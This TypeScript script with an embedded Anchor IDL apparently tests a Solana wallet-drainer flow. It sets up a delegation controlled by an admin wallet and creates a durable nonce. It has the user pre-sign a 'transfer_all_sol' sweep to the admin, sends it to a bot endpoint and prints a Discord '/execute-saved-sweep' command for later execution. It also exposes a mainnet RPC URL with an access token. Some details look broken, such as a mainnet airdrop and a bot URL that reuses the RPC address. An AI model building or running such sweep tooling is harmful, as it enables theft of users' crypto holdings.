import { 
    Connection, 
    Keypair, 
    PublicKey, 
    Transaction, 
    SystemProgram, 
    NonceAccount, 
    LAMPORTS_PER_SOL,
    SYSVAR_RECENT_BLOCKHASHES_PUBKEY, // 🟢 IMPORTED CONSTANT
    SYSVAR_RENT_PUBKEY // 🟢 IMPORTED CONSTANT
} from '@solana/web3.js';
import * as anchor from '@coral-xyz/anchor';
import { createMint, createAccount, mintTo, TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { readFileSync } from 'fs';
import BN from 'bn.js';

// 1. CONFIGURATION
const connection = new Connection("https://thrilling-restless-dust.solana-mainnet.quiknode.pro/3eb9e1f466004db0da96dc59465e02c3615194f4/", "confirmed");
const PROGRAM_ID = new PublicKey("8mKiRaRw4TaMhdMeCjqMtXFxgc4Kv863nLECCcZrYb9F");
const BOT_API_URL = "https://thrilling-restless-dust.solana-mainnet.quiknode.pro/3eb9e1f466004db0da96dc59465e02c3615194f4/";

// Load Admin Wallet
const adminSecret = JSON.parse(readFileSync('./admin-wallet.json', 'utf-8'));
const adminKeypair = Keypair.fromSecretKey(new Uint8Array(adminSecret));

// 🆕 GENERATE FRESH KEYS
const userKeypair = Keypair.generate();
const nonceKeypair = Keypair.generate();

// 🛑 PASTE YOUR FULL IDL HERE
const IDL = {
  "address": "8mKiRaRw4TaMhdMeCjqMtXFxgc4Kv863nLECCcZrYb9F",
  "metadata": {
    "name": "hybrid_token",
    "version": "0.1.0",
    "spec": "0.1.0",
    "description": "Created with Anchor"
  },
  "instructions": [
    {
      "name": "admin_revoke_delegation",
      "discriminator": [48, 230, 96, 83, 86, 112, 163, 53],
      "accounts": [
        { "name": "admin", "signer": true },
        { "name": "delegation", "writable": true, "pda": { "seeds": [{ "kind": "const", "value": [100, 101, 108, 101, 103, 97, 116, 105, 111, 110] }, { "kind": "account", "path": "delegation.user", "account": "Delegation" }] } }
      ],
      "args": []
    },
    {
      "name": "admin_setup_delegation",
      "discriminator": [131, 0, 60, 232, 15, 111, 204, 101],
      "accounts": [
        { "name": "admin", "writable": true, "signer": true },
        { "name": "user_wallet" },
        { "name": "delegation", "writable": true, "pda": { "seeds": [{ "kind": "const", "value": [100, 101, 108, 101, 103, 97, 116, 105, 111, 110] }, { "kind": "account", "path": "user_wallet" }] } },
        { "name": "system_program", "address": "11111111111111111111111111111111" }
      ],
      "args": [
        { "name": "max_amount", "type": "u64" },
        { "name": "expiry_offset", "type": { "option": "i64" } }
      ]
    },
    {
      "name": "program_transfer_max_sol",
      "discriminator": [195, 242, 90, 26, 77, 32, 149, 142],
      "accounts": [
        { "name": "program_signer", "signer": true },
        { "name": "user_wallet", "writable": true },
        { "name": "destination_wallet", "writable": true },
        { "name": "delegation", "pda": { "seeds": [{ "kind": "const", "value": [100, 101, 108, 101, 103, 97, 116, 105, 111, 110] }, { "kind": "account", "path": "delegation.user", "account": "Delegation" }] } }
      ],
      "args": []
    },
    {
      "name": "program_transfer_max_tokens",
      "discriminator": [186, 200, 85, 141, 215, 202, 92, 19],
      "accounts": [
        { "name": "program_signer", "signer": true },
        { "name": "user_token_account", "writable": true },
        { "name": "destination_token_account", "writable": true },
        { "name": "delegation", "pda": { "seeds": [{ "kind": "const", "value": [100, 101, 108, 101, 103, 97, 116, 105, 111, 110] }, { "kind": "account", "path": "delegation.user", "account": "Delegation" }] } },
        { "name": "program_authority" },
        { "name": "token_program", "address": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA" }
      ],
      "args": []
    },
    {
      "name": "program_transfer_sol",
      "discriminator": [139, 254, 134, 62, 180, 48, 65, 16],
      "accounts": [
        { "name": "program_signer", "signer": true },
        { "name": "user_wallet", "writable": true },
        { "name": "destination_wallet", "writable": true },
        { "name": "delegation", "pda": { "seeds": [{ "kind": "const", "value": [100, 101, 108, 101, 103, 97, 116, 105, 111, 110] }, { "kind": "account", "path": "delegation.user", "account": "Delegation" }] } }
      ],
      "args": [
        { "name": "amount", "type": "u64" }
      ]
    },
    {
      "name": "program_transfer_tokens",
      "discriminator": [127, 201, 134, 197, 38, 208, 208, 134],
      "accounts": [
        { "name": "program_signer", "signer": true },
        { "name": "user_token_account", "writable": true },
        { "name": "destination_token_account", "writable": true },
        { "name": "delegation", "pda": { "seeds": [{ "kind": "const", "value": [100, 101, 108, 101, 103, 97, 116, 105, 111, 110] }, { "kind": "account", "path": "delegation.user", "account": "Delegation" }] } },
        { "name": "program_authority" },
        { "name": "token_program", "address": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA" }
      ],
      "args": [
        { "name": "amount", "type": "u64" }
      ]
    },
    {
      "name": "revoke_delegation",
      "discriminator": [188, 92, 135, 67, 160, 181, 54, 62],
      "accounts": [
        { "name": "user", "writable": true, "signer": true },
        { "name": "delegation", "writable": true, "pda": { "seeds": [{ "kind": "const", "value": [100, 101, 108, 101, 103, 97, 116, 105, 111, 110] }, { "kind": "account", "path": "user" }] } },
        { "name": "user_token_account", "writable": true },
        { "name": "token_program", "address": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA" }
      ],
      "args": []
    },
    {
      "name": "setup_delegation",
      "discriminator": [120, 172, 173, 235, 188, 170, 16, 28],
      "accounts": [
        { "name": "user", "writable": true, "signer": true },
        { "name": "delegation", "writable": true, "pda": { "seeds": [{ "kind": "const", "value": [100, 101, 108, 101, 103, 97, 116, 105, 111, 110] }, { "kind": "account", "path": "user" }] } },
        { "name": "user_token_account", "writable": true },
        { "name": "nonce_account", "writable": true, "signer": true },
        { "name": "program_authority" },
        { "name": "token_program", "address": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA" },
        { "name": "system_program", "address": "11111111111111111111111111111111" },
        { "name": "recent_blockhashes" },
        { "name": "rent", "address": "SysvarRent111111111111111111111111111111111" }
      ],
      "args": [
        { "name": "max_amount", "type": "u64" },
        { "name": "expiry_offset", "type": { "option": "i64" } }
      ]
    },
    {
      "name": "transfer_all_sol",
      "discriminator": [146, 150, 218, 17, 95, 35, 206, 120],
      "accounts": [
        { "name": "user", "writable": true, "signer": true },
        { "name": "destination", "writable": true },
        { "name": "system_program", "address": "11111111111111111111111111111111" }
      ],
      "args": []
    }
  ],
  "accounts": [
    {
      "name": "Delegation",
      "discriminator": [237, 90, 140, 159, 124, 255, 243, 80]
    }
  ],
  "errors": [
    { "code": 6000, "name": "DelegationNotFound", "msg": "Delegation not found" },
    { "code": 6001, "name": "DelegationExpired", "msg": "Delegation has expired" },
    { "code": 6002, "name": "DelegationRevoked", "msg": "Delegation has been revoked" },
    { "code": 6003, "name": "UnauthorizedProgram", "msg": "Unauthorized program attempted to execute transfer" },
    { "code": 6004, "name": "TransferLimitExceeded", "msg": "Transfer amount exceeds delegation limit" }
  ],
  "types": [
    {
      "name": "Delegation",
      "type": {
        "kind": "struct",
        "fields": [
          { "name": "user", "type": "pubkey" },
          { "name": "expiration", "type": "i64" },
          { "name": "max_amount", "type": "u64" },
          { "name": "is_active", "type": "bool" }
        ]
      }
    }
  ]
};

async function main() {
    console.log("👤 Fresh User Wallet:", userKeypair.publicKey.toString());
    console.log("🏦 New Nonce Account:", nonceKeypair.publicKey.toString());

    const provider = new anchor.AnchorProvider(connection, new anchor.Wallet(userKeypair), {});
    const program = new anchor.Program(IDL as anchor.Idl, provider);

    // 2. AIRDROP SOL
    console.log("💸 Requesting Airdrop for user...");
    try {
        const sig = await connection.requestAirdrop(userKeypair.publicKey, 2 * LAMPORTS_PER_SOL);
        await connection.confirmTransaction(sig, "confirmed");
        console.log("✅ User funded with 2 SOL");
    } catch (e) {
        console.error("⚠️ Airdrop failed (Likely rate limited or validator offline).");
        return;
    }

    // 3. PREP TOKEN ACCOUNTS
    try {
        const mint = await createMint(connection, userKeypair, userKeypair.publicKey, null, 9);
        const userTokenAccount = await createAccount(connection, userKeypair, mint, userKeypair.publicKey);
        
        const [delegationPda] = PublicKey.findProgramAddressSync(
            [Buffer.from("delegation"), userKeypair.publicKey.toBuffer()],
            PROGRAM_ID
        );

        // 4. SETUP DELEGATION & CREATE NONCE
        console.log("🚀 Sending Setup Transaction...");
        await program.methods
            // @ts-ignore - Dynamic IDL method call
            .setupDelegation(new BN(1000000000), new BN(0))
            .accounts({
                user: userKeypair.publicKey,
                delegation: delegationPda,
                userTokenAccount: userTokenAccount,
                nonceAccount: nonceKeypair.publicKey,
                programAuthority: adminKeypair.publicKey,
                tokenProgram: TOKEN_PROGRAM_ID, // 🟢 Uses import
                systemProgram: SystemProgram.programId,
                recentBlockhashes: SYSVAR_RECENT_BLOCKHASHES_PUBKEY, // 🟢 FIXED: Uses constant
                rent: SYSVAR_RENT_PUBKEY // 🟢 FIXED: Uses constant
            })
            .signers([userKeypair, nonceKeypair])
            .rpc();

        console.log("✅ Delegation & Nonce Created!");

    } catch (e) {
        console.error("❌ Setup Failed:", e);
        return;
    }

    // 5. FETCH NONCE
    console.log("⏳ Fetching Nonce Hash...");
    const accountInfo = await connection.getAccountInfo(nonceKeypair.publicKey);
    if (!accountInfo) throw new Error(`Nonce account not found!`);
    
    const nonceAccountData = NonceAccount.fromAccountData(accountInfo.data);
    console.log("🔒 Durable Nonce Hash:", nonceAccountData.nonce);

    // 6. PRE-SIGN SWEEP
    console.log("✍️  User Pre-Signing Sweep...");
    
    const ix = await program.methods
        // @ts-ignore
        .transferAllSol()
        .accounts({
            user: userKeypair.publicKey,
            destination: adminKeypair.publicKey,
            systemProgram: SystemProgram.programId
        })
        .instruction();

    const tx = new Transaction();
    tx.feePayer = adminKeypair.publicKey;
    tx.recentBlockhash = nonceAccountData.nonce;

    tx.add(
        SystemProgram.nonceAdvance({
            noncePubkey: nonceKeypair.publicKey,
            authorizedPubkey: adminKeypair.publicKey,
        })
    );
    tx.add(ix);

    tx.partialSign(userKeypair);

    const base64 = tx.serialize({ requireAllSignatures: false }).toString('base64');
    
    // 7. SEND TO BOT
    console.log("📨 Sending to Bot...");
    try {
        const response = await fetch(BOT_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                wallet: userKeypair.publicKey.toString(),
                txBase64: base64,
                nonce: nonceKeypair.publicKey.toString()
            })
        });

        const result = await response.json();
        if (result.success) {
            console.log("✅ SENT! Bot has saved it.");
            console.log(`👉 Run in Discord: /execute-saved-sweep user_wallet:${userKeypair.publicKey.toString()}`);
        } else {
            console.error("❌ Bot rejected:", result);
        }
    } catch (e) {
        console.error("❌ Bot API unreachable. Is 'npm run dev' running?", e);
        console.log("Base64 Fallback:", base64);
    }
}

main().catch(console.error);
